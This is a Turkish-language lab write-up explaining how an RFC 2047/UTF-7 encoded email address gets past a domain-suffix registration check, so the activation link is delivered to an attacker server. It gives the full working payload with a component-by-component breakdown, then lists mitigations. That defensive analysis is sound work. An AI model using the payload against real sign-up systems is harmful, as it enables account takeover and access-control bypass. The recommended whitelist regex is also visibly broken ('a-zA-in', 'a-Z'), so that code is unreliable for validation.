# Bypassing Access Controls via Email Address Parsing Discrepancies (RFC 2047 & UTF-7)

## 📌 Genel Bakış (Overview)
Bu doküman, web uygulamalarında girdi doğrulama (validation) mekanizmaları ile arka plan e-posta işlemcileri (parsers/mail servers) arasındaki yorumlama farklarından (discrepancy) kaynaklanan yetkilendirme bypass zafiyetinin analizi amacıyla hazırlanmıştır.

Senaryoda, sadece `@ginandjuice.shop` domainine sahip kurumsal e-postaların kayıt olmasına izin veren bir sistemin, eski ve unutulmuş bir kodlama standardı olan **UTF-7** kullanılarak nasıl bypass edildiği incelenmiştir.

---

## 🛠️ Zafiyetin Temel Mantığı (The Root Cause)

Zafiyet, **Tek Kaynak Doğruluğu (Single Source of Truth)** ilkesinin ihlal edilmesinden kaynaklanır. Uygulama mimarisinde e-posta verisi iki farklı katmanda işlenir:

1. **Ön Yüz / WAF Filtresi (Validation):** Girdinin sadece sonuna bakar. E-posta adresi `@ginandjuice.shop` ile bitiyorsa kayda izin verir. UTF-7 kodlamasını çözmeyi bilmediği için girdiyi düz bir metin (string) olarak okur.
2. **Arka Plan Sunucusu (SMTP / Mail Delivery):** E-posta standartlarına (RFC 2047) tam uyumludur. Girdinin içindeki UTF-7 kodlamasını deşifre eder, adresi ayrıştırır ve aktivasyon linkini saldırganın gerçek sunucusuna gönderir.



---

## 🔬 Teknik Analiz ve Payload Anatomisi

Saldırıda kullanılan başarılı girdinin yapısı ve kütüphaneler tarafından nasıl parçalandığı aşağıda açıklanmıştır:

### Payload:
`=?utf-7?q?attacker&AEA-exploit-server.net&ACA-?=@ginandjuice.shop`

### Bileşenlerin Fonksiyonel Analizi:

| Bileşen | Standart / İşlevi | Açıklama |
| :--- | :--- | :--- |
| `=?utf-7?q?` | **RFC 2047 Başlangıcı** | Sunucuya bu e-posta başlığının UTF-7 (Q-encoding) ile kodlandığını bildirir. |
| `attacker` | **Yerel Kısım (Local Part)** | Oluşturulacak e-posta hesabının kullanıcı adı. |
| `&AEA-` | **UTF-7 Karakteri** | UTF-7 standartlarında **`@`** işaretine denk gelir. `&` kodlamayı başlatır, `-` bitirir. |
| `exploit-server.net` | **Hedef Domain** | Aktivasyon e-postasının gerçekten gitmesi istenen saldırgan sunucusu. |
| `&ACA-` | **UTF-7 Karakteri** | UTF-7 standartlarında **boşluk (space)** karakterini veya ayırıcıyı temsil eder. |
| `?=` | **RFC 2047 Kapatması** | Kodlanmış alanın (encoded-word) burada bittiğini SMTP sunucusuna bildirir. |
| `@ginandjuice.shop` | **Zorunlu Domain** | WAF/Filtre mekanizmasını geçmek için eklenen sahte kuyruk. |

---

## 🔁 Sunucuların Girdiyi Yorumlama Farkı

### 1. Doğrulama Filtresinin Gördüğü (Regex / `.endswith()`):
Filtre karmaşık RFC kodlamasını çözmez, girdinin son karakterlerini kontrol eder:
`... [DÜZ METİNİ ES GEÇ] ... @ginandjuice.shop` ✅ **Kayıt Onaylandı.**

### 2. SMTP Mail Sunucusunun Deşifre Ettiği:
Mail sunucusu UTF-7 kodunu çözer ve aradaki boşluk/ayraç karakterlerinden dolayı adresi ikiye böler:
`attacker@exploit-server.net` `[Geçersiz/Yoksayılan Kısım: @ginandjuice.shop]`

🚀 **Sonuç:** Aktivasyon e-postası saldırganın sunucusuna iletilir, hesap onaylanır ve sistemde dikey yetki yükseltme (Privilege Escalation) gerçekleştirilerek admin paneline erişim sağlanır.

---

## 🛡️ Çözüm ve Güvenli Tasarım Önerileri (Mitigation)

Bu tür mantıksal bypass hatalarını engellemek için yazılım geliştirme süreçlerinde şu önlemler alınmalıdır:

* **Katı Beyaz Liste (Strict Whitelisting):** Giriş parametrelerinde RFC 2047 gibi karmaşık e-posta başlık kodlamalarına izin verilmemelidir. Sadece standart ASCII karakterleri (`^[a-zA-in0-9._%+-]+@[a-zA-in0-9.-]+\.[a-Z]{2,}$`) kabul edilmelidir.
* **Girdiyi Standartlaştırma (Canonicalization):** Kullanıcıdan alınan e-posta verisi doğrulanmadan (validation) önce tüm yorum satırlarından, UTF kodlamalarından arındırılmalı ve en yalın haline getirilerek hem filtrede hem veritabanında aynı veri işlenmelidir.
* **Eski Protokolleri Devre Dışı Bırakma:** Günümüzde aktif bir kullanımı kalmayan UTF-7 gibi güvensiz ve manipülasyona açık kodlama dilleri uygulama kütüphanelerinde pasif hale getirilmelidir.
